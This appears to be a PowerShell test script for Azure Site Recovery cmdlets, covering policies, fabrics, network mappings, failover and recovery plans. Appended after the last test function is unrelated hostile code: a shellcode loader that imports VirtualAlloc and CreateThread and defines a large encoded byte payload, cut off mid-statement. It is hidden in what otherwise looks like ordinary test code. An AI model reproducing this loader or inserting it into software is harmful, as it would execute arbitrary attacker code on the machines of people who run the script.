















$JobQueryWaitTimeInSeconds = 0
$ResourceGroupName = "E2ERg"
$VaultName = "E2ETest"
$FabricNameToBeCreated = "ReleaseFabric"
$PrimaryFabricName = "IDCLAB-A137.ntdev.corp.microsoft.com"
$RecoveryFabricName = "IDCLAB-A147.ntdev.corp.microsoft.com"
$PolicyName = "E2EPolicy1"
$PrimaryProtectionContainerName = "primary"
$RecoveryProtectionContainerName = "recovery"
$ProtectionContainerMappingName = "E2AClP26mapping"
$PrimaryNetworkFriendlyName = "corp"
$RecoveryNetworkFriendlyName = "corp"
$NetworkMappingName = "corp96map"
$VMName = "Vm1"
$RecoveryPlanName = "RPSwag96"
$VmList = "Vm1,Vm3"

function WaitForJobCompletion
{ 
    param(
        [string] $JobId,
        [int] $JobQueryWaitTimeInSeconds = $JobQueryWaitTimeInSeconds
        )
        $isJobLeftForProcessing = $true;
        do
        {
            $Job = Get-AzRecoveryServicesAsrJob -Name $JobId
            $Job

            if($Job.State -eq "InProgress" -or $Job.State -eq "NotStarted")
            {
                $isJobLeftForProcessing = $true
            }
            else
            {
                $isJobLeftForProcessing = $false
            }

            if($isJobLeftForProcessing)
            {
                [Microsoft.Rest.ClientRuntime.Azure.TestFramework.TestUtilities]::Wait($JobQueryWaitTimeInSeconds * 1000)
            }
        }While($isJobLeftForProcessing)
}


Function WaitForIRCompletion
{ 
    param(
        [PSObject] $VM,
        [int] $JobQueryWaitTimeInSeconds = $JobQueryWaitTimeInSeconds
        )
        $isProcessingLeft = $true
        $IRjobs = $null

        do
        {
            $IRjobs = Get-AzRecoveryServicesAsrJob -TargetObjectId $VM.Name | Sort-Object StartTime -Descending | select -First 4 | Where-Object{$_.JobType -eq "PrimaryIrCompletion" -or $_.JobType -eq "SecondaryIrCompletion"}
            if($IRjobs -eq $null -or $IRjobs.Count -lt 2)
            {
                $isProcessingLeft = $true
            }
            else
            {
                $isProcessingLeft = $false
            }

            if($isProcessingLeft)
            {
                [Microsoft.Rest.ClientRuntime.Azure.TestFramework.TestUtilities]::Wait($JobQueryWaitTimeInSeconds * 1000)
            }
        }While($isProcessingLeft)

        $IRjobs
        WaitForJobCompletion -JobId $IRjobs[0].Name -JobQueryWaitTimeInSeconds $JobQueryWaitTimeInSeconds
        WaitForJobCompletion -JobId $IRjobs[1].Name -JobQueryWaitTimeInSeconds $JobQueryWaitTimeInSeconds
}


function Test-SiteRecoveryEnumerationTests
{
    param([string] $vaultSettingsFilePath)

    
    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath

    
    $vaults = Get-AzRecoveryServicesVault
    Assert-True { $vaults.Count -gt 0 }
    Assert-NotNull($vaults)
    foreach($vault in $vaults)
    {
        Assert-NotNull($vault.Name)
        Assert-NotNull($vault.ID)
    }

    
    $rsps = Get-AzRecoveryServicesAsrFabric | Get-AzRecoveryServicesAsrServicesProvider
    Assert-True { $rsps.Count -gt 0 }
    Assert-NotNull($rsps)
    foreach($rsp in $rsps)
    {
        Assert-NotNull($rsp.Name)
        Assert-NotNull($rsp.ID)
    }

    
    $protectionContainers = Get-AzRecoveryServicesAsrFabric | Get-AzRecoveryServicesAsrProtectionContainer
    Assert-True { $protectionContainers.Count -gt 0 }
    Assert-NotNull($protectionContainers)
    foreach($protectionContainer in $protectionContainers)
    {
        Assert-NotNull($protectionContainer.Name)
        Assert-NotNull($protectionContainer.ID)
    }
}


function Test-SiteRecoveryCreatePolicy
{
    param([string] $vaultSettingsFilePath)

    
    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath

    
    $Job = New-AzRecoveryServicesAsrPolicy -Name $PolicyName -ReplicationProvider HyperVReplica2012R2 -ReplicationMethod Online -ReplicationFrequencyInSeconds 30 -RecoveryPoints 1 -ApplicationConsistentSnapshotFrequencyInHours 0 -ReplicationPort 8083 -Authentication Kerberos -ReplicaDeletion Required 
    

    
    $Policy = Get-AzRecoveryServicesAsrPolicy -Name $PolicyName
    Assert-True { $Policy.Count -gt 0 }
    Assert-NotNull($Policy)
}


function Test-SiteRecoveryRemovePolicy
{
    param([string] $vaultSettingsFilePath)

    
    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath

    
    $Policy = Get-AzRecoveryServicesAsrPolicy -Name $PolicyName
    Assert-True { $Policy.Count -gt 0 }
    Assert-NotNull($Policy)

    
    $Job = Remove-AzRecoveryServicesAsrPolicy -Policy $Policy
    
}


function Test-RemoveFabric
{
    param([string] $vaultSettingsFilePath)

    
    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath

    
    $fabric = Get-AzRecoveryServicesAsrFabric -FriendlyName $PrimaryFabricName 
    $job = Remove-ASRFabric -InputObject $fabric
    WaitForJobCompletion -JobId $job.Name

    Get-AzRecoveryServicesAsrFabric|Remove-ASRFabric
    
}

function Test-CreatePCMap
{
    param([string] $vaultSettingsFilePath)

    
    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath

    
    $Policy = Get-AzRecoveryServicesAsrPolicy -Name $PolicyName;
    $PrimaryProtectionContainer = Get-AzRecoveryServicesAsrFabric -FriendlyName $PrimaryFabricName| Get-AzRecoveryServicesAsrProtectionContainer | where { $_.FriendlyName -eq $PrimaryProtectionContainerName }
    $RecoveryProtectionContainer = Get-AzRecoveryServicesAsrFabric -FriendlyName $recoveryFabricName| Get-AzRecoveryServicesAsrProtectionContainer | where { $_.FriendlyName -eq $RecoveryProtectionContainerName }

    
    $Job = New-AzRecoveryServicesAsrProtectionContainerMapping -Name $ProtectionContainerMappingName -Policy $Policy -PrimaryProtectionContainer $PrimaryProtectionContainer -RecoveryProtectionContainer $RecoveryProtectionContainer
    WaitForJobCompletion -JobId $Job.Name

    
    $ProtectionContainerMapping = Get-AzRecoveryServicesAsrProtectionContainerMapping -Name $ProtectionContainerMappingName -ProtectionContainer $PrimaryProtectionContainer
    Assert-NotNull($ProtectionContainerMapping)
}


function Test-SiteRecoveryEnableDR
{
    param([string] $vaultSettingsFilePath)

    
    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath

    
    $PrimaryProtectionContainer = Get-AzRecoveryServicesAsrFabric -FriendlyName $PrimaryFabricName | Get-AzRecoveryServicesAsrProtectionContainer | where { $_.FriendlyName -eq $PrimaryProtectionContainerName }

    
    $ProtectionContainerMapping = Get-AzRecoveryServicesAsrProtectionContainerMapping -Name $ProtectionContainerMappingName -ProtectionContainer $PrimaryProtectionContainer

    foreach($EnableVMName in $VmList.Split(','))
    {
        
        $VM = Get-AzRecoveryServicesAsrProtectableItem -FriendlyName $EnableVMName -ProtectionContainer $PrimaryProtectionContainer  

        
        $Job = New-AzRecoveryServicesAsrReplicationProtectedItem -ProtectableItem $VM -Name $VM.Name -ProtectionContainerMapping $ProtectionContainerMapping
        WaitForJobCompletion -JobId $Job.Name
        WaitForIRCompletion -VM $VM 
    }
}


function Test-MapNetwork
{
    param([string] $vaultSettingsFilePath)
    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath

    
    $PrimaryFabric = Get-AzRecoveryServicesAsrFabric -FriendlyName $PrimaryFabricName
    $RecoveryFabric = Get-AzRecoveryServicesAsrFabric -FriendlyName $RecoveryFabricName

    
    $PrimaryNetwork = Get-AzRecoveryServicesAsrNetwork -Fabric $PrimaryFabric | where { $_.FriendlyName -eq $PrimaryNetworkFriendlyName}
    $RecoveryNetwork = Get-AzRecoveryServicesAsrNetwork -Fabric $RecoveryFabric | where { $_.FriendlyName -eq $RecoveryNetworkFriendlyName}

    
    $Job = New-AzRecoveryServicesAsrNetworkMapping -Name $NetworkMappingName -PrimaryNetwork $PrimaryNetwork -RecoveryNetwork $RecoveryNetwork
    WaitForJobCompletion -JobId $Job.Name

    
    $NetworkMapping = Get-AzRecoveryServicesAsrNetworkMapping -Name $NetworkMappingName -Network $PrimaryNetwork

    }

    function Test-RemoveNetworkPairing
    {
        param([string] $vaultSettingsFilePath)
        Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath

        
        $PrimaryFabric = Get-AzRecoveryServicesAsrFabric -FriendlyName $PrimaryFabricName
        $RecoveryFabric = Get-AzRecoveryServicesAsrFabric -FriendlyName $RecoveryFabricName

        
        $PrimaryNetwork = Get-AzRecoveryServicesAsrNetwork -Fabric $PrimaryFabric | where { $_.FriendlyName -eq $PrimaryNetworkFriendlyName}
        $RecoveryNetwork = Get-AzRecoveryServicesAsrNetwork -Fabric $RecoveryFabric | where { $_.FriendlyName -eq $RecoveryNetworkFriendlyName}

        
        $job = Get-AzRecoveryServicesAsrNetworkMapping -Name $NetworkMappingName -Network $PrimaryNetwork |Remove-ASRNetworkMapping
        WaitForJobCompletion -JobId $Job.Name
    }

function Test-TFO
{
    param([string] $vaultSettingsFilePath)

    
    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath

    
    $PrimaryProtectionContainer = Get-AzRecoveryServicesAsrFabric -FriendlyName $PrimaryFabricName | Get-AzRecoveryServicesAsrProtectionContainer | where { $_.FriendlyName -eq $PrimaryProtectionContainerName }

    $RecoveryFabric = Get-AzRecoveryServicesAsrFabric -FriendlyName $RecoveryFabricName

    $RecoveryNetwork = Get-AzRecoveryServicesAsrNetwork -Fabric $RecoveryFabric | where { $_.FriendlyName -eq $RecoveryNetworkFriendlyName}

    
    $VM = Get-AzRecoveryServicesAsrProtectableItem -FriendlyName $VMName -ProtectionContainer $PrimaryProtectionContainer  
    
    $rpi = Get-AzRecoveryServicesAsrReplicationProtectedItem -FriendlyName $VMName -ProtectionContainer $PrimaryProtectionContainer 
    $rpi = Get-AzRecoveryServicesAsrReplicationProtectedItem -Name $rpi.Name -ProtectionContainer $PrimaryProtectionContainer 
    $rpi = Get-AzRecoveryServicesAsrReplicationProtectedItem -ProtectableItem $VM  
    $job = Start-ASRTestFailoverJob -ReplicationProtectedItem $rpi -Direction PrimaryToRecovery

    WaitForJobCompletion -JobId $Job.Name

    $job = Start-ASRTestFailoverCleanupJob -ReplicationProtectedItem $rpi
    WaitForJobCompletion -JobId $Job.Name

    $job = Start-ASRTestFailoverJob -ReplicationProtectedItem $rpi -Direction PrimaryToRecovery -VMNetwork $RecoveryNetwork

    WaitForJobCompletion -JobId $Job.Name

    $job = Start-ASRTestFailoverCleanupJob -ReplicationProtectedItem $rpi
    WaitForJobCompletion -JobId $Job.Name
}


function Test-PlannedFailover
{
    param([string] $vaultSettingsFilePath)

    
    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath

    
    $PrimaryProtectionContainer = Get-AzRecoveryServicesAsrFabric -FriendlyName $PrimaryFabricName | Get-AzRecoveryServicesAsrProtectionContainer | where { $_.FriendlyName -eq $PrimaryProtectionContainerName }

    $rpi = Get-AzRecoveryServicesAsrReplicationProtectedItem -FriendlyName $VMName -ProtectionContainer $PrimaryProtectionContainer 
 
    $job =  Start-AzRecoveryServicesAsrPlannedFailoverJob -ReplicationProtectedItem $rpi -Direction PrimaryToRecovery

    WaitForJobCompletion -JobId $Job.Name
}


function Test-Reprotect
{
    param([string] $vaultSettingsFilePath)

    
    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath

    
    $PrimaryProtectionContainer = Get-AzRecoveryServicesAsrFabric -FriendlyName $PrimaryFabricName | Get-AzRecoveryServicesAsrProtectionContainer | where { $_.FriendlyName -eq $PrimaryProtectionContainerName }

    $rpi = Get-AzRecoveryServicesAsrReplicationProtectedItem -FriendlyName $VMName -ProtectionContainer $PrimaryProtectionContainer 
    $currentJob = Update-ASRProtectionDirection -ReplicationProtectedItem $rpi -Direction RecoveryToPrimary
    WaitForJobCompletion -JobId $currentJob.Name 
}


function Test-FailbackReprotect
{
    param([string] $vaultSettingsFilePath)

    
    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath

    
    $PrimaryProtectionContainer = Get-AzRecoveryServicesAsrFabric -FriendlyName $PrimaryFabricName | Get-AzRecoveryServicesAsrProtectionContainer | where { $_.FriendlyName -eq $PrimaryProtectionContainerName }

    $rpi = Get-AzRecoveryServicesAsrReplicationProtectedItem -FriendlyName $VMName -ProtectionContainer $PrimaryProtectionContainer 

    $job =  Start-AzRecoveryServicesAsrPlannedFailoverJob -ReplicationProtectedItem $rpi -Direction RecoveryToPrimary

    WaitForJobCompletion -JobId $Job.Name

    $rpi = Get-AzRecoveryServicesAsrReplicationProtectedItem -FriendlyName $VMName -ProtectionContainer $PrimaryProtectionContainer 

    $job = Start-ASRCommitFailoverJob -ReplicationProtectedItem $rpi 
    WaitForJobCompletion -JobId $Job.Name

    $rpi = Get-AzRecoveryServicesAsrReplicationProtectedItem -FriendlyName $VMName -ProtectionContainer $PrimaryProtectionContainer 
    $currentJob = Update-ASRProtectionDirection -ReplicationProtectedItem $rpi -Direction PrimaryToRecovery

    WaitForJobCompletion -JobId $currentJob.Name 
}


function Test-UFOandFailback
{
    param([string] $vaultSettingsFilePath)

    
    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath

    
    $PrimaryProtectionContainer = Get-AzRecoveryServicesAsrFabric -FriendlyName $PrimaryFabricName | Get-AzRecoveryServicesAsrProtectionContainer | where { $_.FriendlyName -eq $PrimaryProtectionContainerName }

    $rpi = Get-ASRReplicationProtectedItem -FriendlyName $VMName -ProtectionContainer $PrimaryProtectionContainer 

    $job =  Start-AsrUnPlannedFailoverJob -ReplicationProtectedItem $rpi -Direction PrimaryToRecovery
    WaitForJobCompletion -JobId $Job.Name

    $rpi = Get-AsrReplicationProtectedItem -FriendlyName $VMName -ProtectionContainer $PrimaryProtectionContainer 
    $currentJob = Update-ASRProtectionDirection -ReplicationProtectedItem $rpi -Direction RecoveryToPrimary
    WaitForJobCompletion -JobId $currentJob.Name 
    WaitForIRCompletion -VM $rpi 
    

    $rpi = Get-AzRecoveryServicesAsrReplicationProtectedItem -FriendlyName $VMName -ProtectionContainer $PrimaryProtectionContainer 
    $job =  Start-AzRecoveryServicesAsrUnPlannedFailoverJob -ReplicationProtectedItem $rpi -Direction RecoveryToPrimary
    WaitForJobCompletion -JobId $Job.Name
    $rpi = Get-AzRecoveryServicesAsrReplicationProtectedItem -FriendlyName $VMName -ProtectionContainer $PrimaryProtectionContainer 
    $currentJob = Update-ASRProtectionDirection -ReplicationProtectedItem $rpi -Direction PrimaryToRecovery
    WaitForJobCompletion -JobId $currentJob.Name  
}


function Test-RemovePCMap
{
    param([string] $vaultSettingsFilePath)

    
    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath

    
    $PrimaryProtectionContainer = Get-AzRecoveryServicesAsrFabric -FriendlyName $PrimaryFabricName| Get-AzRecoveryServicesAsrProtectionContainer | where { $_.FriendlyName -eq $PrimaryProtectionContainerName }

    
    $ProtectionContainerMapping = Get-AzRecoveryServicesAsrProtectionContainerMapping -Name $ProtectionContainerMappingName -ProtectionContainer $PrimaryProtectionContainer

    
    $Job = Remove-AzRecoveryServicesAsrProtectionContainerMapping -ProtectionContainerMapping $ProtectionContainerMapping
    
}





function Test-SiteRecoveryDisableDR
{
    param([string] $vaultSettingsFilePath)

    
    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath

    
    $PrimaryProtectionContainer = Get-AzRecoveryServicesAsrFabric -FriendlyName $PrimaryFabricName | Get-AzRecoveryServicesAsrProtectionContainer | where { $_.FriendlyName -eq $PrimaryProtectionContainerName }

    
    $VM = Get-AzRecoveryServicesAsrReplicationProtectedItem -FriendlyName $VMName -ProtectionContainer $PrimaryProtectionContainer  

    
    $Job = Remove-AzRecoveryServicesAsrReplicationProtectedItem -ReplicationProtectedItem $VM

    WaitForJobCompletion -JobId $Job.Name

    Get-ASRReplicationProtectedItem -ProtectionContainer $PrimaryProtectionContainer  | Remove-AzRecoveryServicesAsrReplicationProtectedItem
    
}


function Test-SiteRecoveryCreateRecoveryPlan
{
    param([string] $vaultSettingsFilePath)

    
    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath

    
    $PrimaryFabric = Get-AzRecoveryServicesAsrFabric -FriendlyName $PrimaryFabricName
    $RecoveryFabric = Get-AzRecoveryServicesAsrFabric -FriendlyName $RecoveryFabricName
    $PrimaryProtectionContainer = Get-AzRecoveryServicesAsrProtectionContainer -FriendlyName $PrimaryProtectionContainerName -Fabric $PrimaryFabric
    $VM = Get-AzRecoveryServicesAsrReplicationProtectedItem -FriendlyName $VMName -ProtectionContainer $PrimaryProtectionContainer

    $Job = New-AzRecoveryServicesAsrRecoveryPlan -Name $RecoveryPlanName -PrimaryFabric $PrimaryFabric -RecoveryFabric $RecoveryFabric -ReplicationProtectedItem $VM
    
}


function Test-SiteRecoveryEnumerateRecoveryPlan
{
    param([string] $vaultSettingsFilePath)

    
    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath

    $RP = Get-AzRecoveryServicesAsrRecoveryPlan -Name $RecoveryPlanName
    Assert-NotNull($RP)
    Assert-True { $RP.Count -gt 0 }
}


function Test-EditRecoveryPlan
{
    param([string] $vaultSettingsFilePath)

    
    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath

    $RP = Get-AsrRecoveryPlan -Name $RecoveryPlanName
    $RP = Edit-ASRRecoveryPlan -RecoveryPlan $RP -AppendGroup

    $VMNameList = $VMList.split(',')
    $PrimaryFabric = Get-AzRecoveryServicesAsrFabric -FriendlyName $PrimaryFabricName
    $PrimaryProtectionContainer = Get-AzRecoveryServicesAsrProtectionContainer -FriendlyName $PrimaryProtectionContainerName -Fabric $PrimaryFabric
    
    $VMList = Get-ASRReplicationProtectedItem -ProtectionContainer $PrimaryProtectionContainer
    $VM = $VMList | where { $_.FriendlyName -eq $VMNameList[1] }
    

    $RP = Edit-ASRRecoveryPlan -RecoveryPlan $RP -Group $RP.Groups[3] -AddProtectedItems $VM
    $RP.Groups

    Write-Host $("Triggered Update RP") -ForegroundColor Green
    $currentJob = Update-ASRRecoveryPlan -RecoveryPlan $RP
    WaitForJobCompletion -JobId $currentJob.Name
    
}


function Test-RecoveryPlanJob
{
    param([string] $vaultSettingsFilePath)

    
    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath

    $RP = Get-AsrRecoveryPlan -Name $RecoveryPlanName
    $RecoveryFabric = Get-AzRecoveryServicesAsrFabric -FriendlyName $RecoveryFabricName

    $RecoveryNetwork = Get-AzRecoveryServicesAsrNetwork -Fabric $RecoveryFabric | where { $_.FriendlyName -eq $RecoveryNetworkFriendlyName}

    $currentJob = Start-ASRTestFailoverJob -RecoveryPlan $RP -Direction PrimaryToRecovery -VMNetwork $RecoveryNetwork
    WaitForJobCompletion -JobId $currentJob.Name
    $currentJob = Start-ASRTestFailoverCleanupJob -RecoveryPlan $RP
    WaitForJobCompletion -JobId $currentJob.Name

    $currentJob = Start-ASRTestFailoverJob -RecoveryPlan $RP -Direction PrimaryToRecovery
    WaitForJobCompletion -JobId $currentJob.Name
    $currentJob = Start-ASRTestFailoverCleanupJob -RecoveryPlan $RP
    WaitForJobCompletion -JobId $currentJob.Name

    $currentJob = Start-ASRPlannedFailoverJob -RecoveryPlan $RP -Direction PrimaryToRecovery
    WaitForJobCompletion -JobId $currentJob.Name 

    $currentJob = Start-AsrCommitFailoverJob -RecoveryPlan $RP
    $currentJob
    WaitForJobCompletion -JobId $currentJob.Name

    $currentJob = Update-AsrProtectionDirection -RecoveryPlan $RP -Direction RecoveryToPrimary 
    $currentJob
    WaitForJobCompletion -JobId $currentJob.Name
    
    

    $currentJob = Start-AsrUnPlannedFailoverJob -RecoveryPlan $RP -Direction RecoveryToPrimary
    $currentJob
    WaitForJobCompletion -JobId $currentJob.Name

    $currentJob = Start-AsrCommitFailoverJob -RecoveryPlan $RP
    $currentJob
    WaitForJobCompletion -JobId $currentJob.Name 
    
}

function Test-SiteRecoveryRemoveRecoveryPlan
{
    param([string] $vaultSettingsFilePath)

    
    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath

    $RP = Get-AzRecoveryServicesAsrRecoveryPlan -Name $RecoveryPlanName
    $Job = Remove-AzRecoveryServicesAsrRecoveryPlan -RecoveryPlan $RP
    
}


function Test-SiteRecoveryFabricTest
{
    param([string] $vaultSettingsFilePath)

    
    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath

    
    $Job = New-AzRecoveryServicesAsrFabric -Name $FabricNameToBeCreated -Type HyperVSite
    
    Assert-NotNull($Job)
    WaitForJobCompletion -JobId $job.name

    
    $fabrics =  Get-AzRecoveryServicesAsrFabric 
    Assert-True { $fabrics.Count -gt 0 }
    Assert-NotNull($fabrics)
    foreach($fabric in $fabrics)
    {
        Assert-NotNull($fabrics.Name)
        Assert-NotNull($fabrics.ID)
    }

    
    $fabric =  Get-AzRecoveryServicesAsrFabric -Name $FabricNameToBeCreated
    Assert-NotNull($fabric)
    Assert-NotNull($fabrics.Name)
    Assert-NotNull($fabrics.ID)

    
    $Job = Remove-AzRecoveryServicesAsrFabric -Fabric $fabric
    Assert-NotNull($Job)
    
    $fabric =  Get-AzRecoveryServicesAsrFabric | Where-Object {$_.Name -eq $FabricNameToBeCreated }
    Assert-Null($fabric)
}



function Test-SiteRecoveryNewModelE2ETest
{
    param([string] $vaultSettingsFilePath)

    
    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath

    
    $Fabrics =  Get-AzRecoveryServicesAsrFabric 
    Assert-True { $fabrics.Count -gt 0 }
    Assert-NotNull($fabrics)
    foreach($fabric in $fabrics)
    {
        Assert-NotNull($fabrics.Name)
        Assert-NotNull($fabrics.ID)
    }
    $PrimaryFabric = $Fabrics | Where-Object { $_.FriendlyName -eq $PrimaryFabricName}
    $RecoveryFabric = $Fabrics | Where-Object { $_.FriendlyName -eq $RecoveryFabricName}

    
    $rsps = Get-AzRecoveryServicesAsrFabric | Get-AzRecoveryServicesAsrServicesProvider
    Assert-True { $rsps.Count -gt 0 }
    Assert-NotNull($rsps)
    foreach($rsp in $rsps)
    {
        Assert-NotNull($rsp.Name)
    }

    
    $Job = New-AzRecoveryServicesAsrPolicy -Name $PolicyName -ReplicationProvider HyperVReplica2012R2 -ReplicationMethod Online -ReplicationFrequencyInSeconds 30 -RecoveryPoints 1 -ApplicationConsistentSnapshotFrequencyInHours 0 -ReplicationPort 8083 -Authentication Kerberos -ReplicaDeletion Required
    

    $Policy = Get-AzRecoveryServicesAsrPolicy -Name $PolicyName
    Assert-NotNull($Policy)
    Assert-NotNull($Policy.Name)

    
    $PrimaryProtectionContainer = Get-AzRecoveryServicesAsrFabric | Get-AzRecoveryServicesAsrProtectionContainer | where { $_.FriendlyName -eq $PrimaryProtectionContainerName }
    Assert-NotNull($PrimaryProtectionContainer)
    Assert-NotNull($PrimaryProtectionContainer.Name)
    $RecoveryProtectionContainer = Get-AzRecoveryServicesAsrFabric | Get-AzRecoveryServicesAsrProtectionContainer | where { $_.FriendlyName -eq $RecoveryProtectionContainerName }
    Assert-NotNull($RecoveryProtectionContainer)
    Assert-NotNull($RecoveryProtectionContainer.Name)

    
    $Job = New-AzRecoveryServicesAsrProtectionContainerMapping -Name $ProtectionContainerMappingName -Policy $Policy -PrimaryProtectionContainer $PrimaryProtectionContainer -RecoveryProtectionContainer $RecoveryProtectionContainer
    

    
    $ProtectionContainerMapping = Get-AzRecoveryServicesAsrProtectionContainerMapping -Name $ProtectionContainerMappingName -ProtectionContainer $PrimaryProtectionContainer
    Assert-NotNull($ProtectionContainerMapping)
    Assert-NotNull($ProtectionContainerMapping.Name)

    
    $PrimaryNetwork = Get-AzRecoveryServicesAsrNetwork -Fabric $PrimaryFabric | where { $_.FriendlyName -eq $PrimaryNetworkFriendlyName}
    $RecoveryNetwork = Get-AzRecoveryServicesAsrNetwork -Fabric $RecoveryFabric | where { $_.FriendlyName -eq $RecoveryNetworkFriendlyName}

    
    $Job = New-AzRecoveryServicesAsrNetworkMapping -Name $NetworkMappingName -PrimaryNetwork $PrimaryNetwork -RecoveryNetwork $RecoveryNetwork
    

    
    $NetworkMapping = Get-AzRecoveryServicesAsrNetworkMapping -Name $NetworkMappingName -Network $PrimaryNetwork

    
    $protectable = Get-AzRecoveryServicesAsrProtectableItem -ProtectionContainer $PrimaryProtectionContainer -FriendlyName $VMName
    Assert-NotNull($protectable)
    Assert-NotNull($protectable.Name)

    
    $Job = New-AzRecoveryServicesAsrReplicationProtectedItem -ProtectableItem $protectable -Name $protectable.Name -ProtectionContainerMapping $ProtectionContainerMapping
    
    
    Assert-NotNull($Job)

    
    $protected = Get-AzRecoveryServicesAsrReplicationProtectedItem -ProtectionContainer $PrimaryProtectionContainer -Name $protectable.Name
    Assert-NotNull($protected)
    Assert-NotNull($protected.Name)

    
    $Job = Remove-AzRecoveryServicesAsrReplicationProtectedItem -ReplicationProtectedItem $protected
    
    $protected = Get-AzRecoveryServicesAsrReplicationProtectedItem -ProtectionContainer $PrimaryProtectionContainer | Where-Object {$_.Name -eq $protectable.Name} 
    Assert-Null($protected)

    
    $Job = Remove-AzRecoveryServicesAsrNetworkMapping -NetworkMapping $NetworkMapping
    

    
    $Job = Remove-AzRecoveryServicesAsrProtectionContainerMapping -ProtectionContainerMapping $ProtectionContainerMapping
    
    $ProtectionContainerMapping = Get-AzRecoveryServicesAsrProtectionContainerMapping -ProtectionContainer $PrimaryProtectionContainer | Where-Object {$_.Name -eq $ProtectionContainerMappingName}
    Assert-Null($ProtectionContainerMapping)

    
    $Job = Remove-AzRecoveryServicesAsrPolicy -Policy $Policy
    
    $Policy = Get-AzRecoveryServicesAsrPolicy | Where-Object {$_.Name -eq $PolicyName}
    Assert-Null($Policy)
}

$PS2 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $PS2 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdd,0xc7,0xd9,0x74,0x24,0xf4,0x5d,0x29,0xc9,0xba,0x89,0xb1,0x54,0x8a,0xb1,0x57,0x83,0xed,0xfc,0x31,0x55,0x14,0x03,0x55,0x9d,0x53,0xa1,0x76,0x75,0x11,0x4a,0x87,0x85,0x76,0xc2,0x62,0xb4,0xb6,0xb0,0xe7,0xe6,0x06,0xb2,0xaa,0x0a,0xec,0x96,0x5e,0x99,0x80,0x3e,0x50,0x2a,0x2e,0x19,0x5f,0xab,0x03,0x59,0xfe,0x2f,0x5e,0x8e,0x20,0x0e,0x91,0xc3,0x21,0x57,0xcc,0x2e,0x73,0x00,0x9a,0x9d,0x64,0x25,0xd6,0x1d,0x0e,0x75,0xf6,0x25,0xf3,0xcd,0xf9,0x04,0xa2,0x46,0xa0,0x86,0x44,0x8b,0xd8,0x8e,0x5e,0xc8,0xe5,0x59,0xd4,0x3a,0x91,0x5b,0x3c,0x73,0x5a,0xf7,0x01,0xbc,0xa9,0x09,0x45,0x7a,0x52,0x7c,0xbf,0x79,0xef,0x87,0x04,0x00,0x2b,0x0d,0x9f,0xa2,0xb8,0xb5,0x7b,0x53,0x6c,0x23,0x0f,0x5f,0xd9,0x27,0x57,0x43,0xdc,0xe4,0xe3,0x7f,0x55,0x0b,0x24,0xf6,0x2d,0x28,0xe0,0x53,0xf5,0x51,0xb1,0x39,0x58,0x6d,0xa1,0xe2,0x05,0xcb,0xa9,0x0e,0x51,0x66,0xf0,0x46,0xcb,0x1c,0x7f,0x96,0x7b,0xa8,0x16,0xf8,0x12,0x02,0x81,0x48,0x92,0x8c,0x56,0xaf,0x89,0xe0,0x83,0x1c,0x61,0x50,0x67,0xf1,0xed,0x6c,0xd1,0x8c,0x4a,0x6f,0x08,0x3d,0xc6,0xfa,0xb0,0x92,0xbb,0x92,0x0d,0x15,0x3c,0x63,0x9a,0x99,0x3c,0x63,0x5a,0x8e,0x7f,0x51,0x36,0xe1,0x35,0x95,0x96,0x69,0x9d,0x1c,0x89,0xaf,0xde,0xca,0x3f,0xe9,0x72,0x9d,0x3f,0xc7,0x94,0xd9,0x13,0x74,0x06,0xb5,0xc0,0x2c,0xc0,0xd2,0xb2,0xfe,0x2b,0xda,0xe8,0x68,0x21,0x2e,0x4c,0xfc,0x36,0x1d,0x72,0xfc,0xbf,0x82,0x18,0xf8,0xef,0x28,0xc2,0x56,0x78,0xd8,0xba,0xc8,0xfe,0xdd,0x96,0xa7,0xad,0x72,0x4a,0x11,0x3a,0x58,0x6a,0x85,0xc1,0x5d,0xa7,0x30,0xf5,0xd7,0x42,0x75,0x83,0xce,0x3b,0x79,0xde,0x53,0xed,0x86,0xf4,0xfe,0x52,0x10,0xf7,0xee,0x52,0xe0,0x9f,0x0e,0x53,0xa0,0x5f,0x5c,0x3b,0x78,0xc4,0x31,0x5e,0x87,0xd1,0x25,0xf3,0x24,0x53,0xae,0xa3,0xa2,0x63,0x11,0x4c,0x32,0x37,0x07,0x24,0x20,0x21,0x2e,0x56,0xbb,0x98,0xb4,0x57,0x37,0xee,0x3c,0x50,0xb6,0x33,0xc7,0x9f,0xcd,0x56,0x90,0xdc,0x72,0x71,0x54,0x1c,0x73,0x7e,0xa6,0xdb,0xb9,0xaf,0xf8,0x2d,0x85,0x81,0xcb,0x7f,0xc4,0xed,0x18,0x80;$g = 